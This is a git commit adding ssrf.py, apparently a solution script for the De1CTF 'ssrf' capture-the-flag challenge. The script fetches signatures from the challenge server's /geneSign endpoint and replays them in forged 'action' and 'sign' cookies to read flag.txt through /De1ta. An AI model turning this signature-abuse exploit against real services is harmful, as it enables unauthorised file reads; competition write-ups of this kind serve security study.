287c0c01ca914bc63d3bcf738981165d27808a6f
imthoe <31655061+imthoe@users.noreply.github.com>
2019-08-05 20:46:32 +0200

    Create ssrf.py

---
+++ de1ctf/ssrf/ssrf.py
@@ -0,0 +1,28 @@
+import requests
+
+param = 'flag.txt'
+base_url = 'http://139.180.128.86'
+
+def getSign(param):
+    r = requests.get(base_url+'/geneSign?param='+param)
+    return r.text
+
+scan_sign = getSign(param)
+read_sign = getSign(param+'read')
+
+
+print scan_sign
+print read_sign
+
+cookies = {}
+cookies['action'] = 'scan'
+cookies['sign'] = scan_sign
+
+r = requests.get(base_url+'/De1ta?param='+param,cookies=cookies)
+print r.text
+
+cookies['action'] = 'readscan'
+cookies['sign'] = read_sign
+
+r = requests.get(base_url+'/De1ta?param='+param,cookies=cookies)
+print r.text
